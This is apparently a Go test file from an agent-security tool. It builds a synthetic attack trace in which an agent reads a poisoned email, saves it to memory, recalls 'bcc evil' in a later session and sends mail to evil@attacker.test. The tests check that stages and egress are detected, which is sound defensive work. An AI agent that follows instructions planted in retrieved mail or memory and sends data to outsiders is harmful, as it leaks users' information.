package breach

import (
	"testing"
	"time"

	"github.com/41vi4p/avhsol/core/internal/trace"
)

func msTrace(recall bool) *trace.Trace {
	tr := &trace.Trace{TraceID: "t", Kind: "attack", Success: true, StartedAt: time.Now(), Attack: &trace.Attack{Surface: "mail"}}
	add := func(typ string, d map[string]any) { _, _ = tr.Append(typ, time.Now().UnixMilli(), d) }
	add(trace.StepUserTurn, map[string]any{"text": "summarise"})
	add(trace.StepToolCall, map[string]any{"id": "a", "name": "read_document", "args": map[string]any{"doc_id": "mail"}})
	add(trace.StepToolResult, map[string]any{"id": "a", "content": "evil", "source": "retrieved:mail"})
	add(trace.StepToolCall, map[string]any{"id": "b", "name": "memory_write", "args": map[string]any{"key": "k"}})
	add(trace.StepToolResult, map[string]any{"id": "b", "content": "saved k"})
	add(trace.StepUserTurn, map[string]any{"text": "email my manager", "session": 2})
	if recall {
		add(trace.StepToolCall, map[string]any{"id": "c", "name": "memory_read", "args": map[string]any{"key": "k"}})
		add(trace.StepToolResult, map[string]any{"id": "c", "content": "bcc evil", "source": "memory:k"})
	}
	add(trace.StepToolCall, map[string]any{"id": "d", "name": "send_email", "args": map[string]any{"to": "evil@attacker.test"}})
	add(trace.StepToolResult, map[string]any{"id": "d", "content": "sent"})
	return tr
}

func TestStagesAreCountedFromSessionMarkers(t *testing.T) {
	st := trace.Stages(msTrace(true).Steps)
	if st[0] != 1 || st[4] != 1 || st[5] != 2 || st[len(st)-1] != 2 {
		t.Fatalf("%v", st)
	}
	if got := trace.Stages(nil); len(got) != 0 {
		t.Fatal("empty trace")
	}
}

func TestBreachLineShowsMemoryRecallAndEgressAcrossStages(t *testing.T) {
	nodes := Strip(msTrace(true))
	kinds := map[string]int{}
	for _, n := range nodes {
		kinds[n.Kind]++
	}
	if kinds["memory"] != 1 || kinds["recall"] != 1 {
		t.Fatalf("%+v", nodes)
	}
	stages, multi := Depth(nodes)
	if stages != 2 || !multi {
		t.Fatalf("depth %d multi %v: %+v", stages, multi, nodes)
	}
	var memStage, egressStage int
	for _, n := range nodes {
		switch n.Kind {
		case "memory":
			memStage = n.Stage
		case "egress":
			egressStage = n.Stage
		}
	}
	if memStage != 1 || egressStage != 2 {
		t.Fatalf("stage labels wrong: mem=%d egress=%d", memStage, egressStage)
	}
}

func TestSingleStageTraceIsNotMultiStage(t *testing.T) {
	tr := &trace.Trace{Kind: "attack", StartedAt: time.Now()}
	_, _ = tr.Append(trace.StepUserTurn, 1, map[string]any{"text": "x"})
	_, _ = tr.Append(trace.StepToolCall, 2, map[string]any{"id": "a", "name": "send_email", "args": map[string]any{"to": "e@x.test"}})
	if s, m := Depth(Strip(tr)); s != 1 || m {
		t.Fatalf("%d %v", s, m)
	}
}
